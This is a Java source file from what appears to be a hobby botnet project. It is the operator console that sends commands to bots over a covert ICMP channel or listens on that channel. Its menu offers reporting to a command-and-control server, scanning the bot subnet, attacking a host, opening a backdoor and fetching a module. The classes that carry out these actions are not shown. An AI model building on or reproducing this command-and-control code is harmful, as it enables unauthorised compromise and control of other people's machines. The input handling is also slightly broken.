package ca.franky.byob;


import java.io.IOException;

public class ClientMain {

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		
	    char userInput = 0;
	      System.out.println("Do you want to (L)isten or (S)end?");
	      try {
			userInput = (char)System.in.read();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
	      try {
			System.in.read();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		if ( Character.toString(userInput).toUpperCase().equals("L")) {
			Thread thread = new ClientListenOnICMPChannel();
	    	thread.start();  
	    } else if ( Character.toString(userInput).toUpperCase().equals("S")) {
	    	 userInput = '0';
    		 System.out.println("Do you want to \n(0)Report to C&C\n(1)Scan the bot subnet\n(2)Attack a host\n(3)Open a backdoor\n(4)Fetch a module\nDefault is [0] ");
		     try {
				userInput = (char)System.in.read();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
		      try {
				System.in.read();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			if ( Integer.parseInt(Character.toString(userInput)) > 4  ) {
				System.out.println("The user choice defaulted to "+userInput);
			}
				   
	    	ServerSendCommandViaICMP myCmd = new ServerSendCommandViaICMP();
	    	myCmd.send(userInput);
	    }
	}
	
}
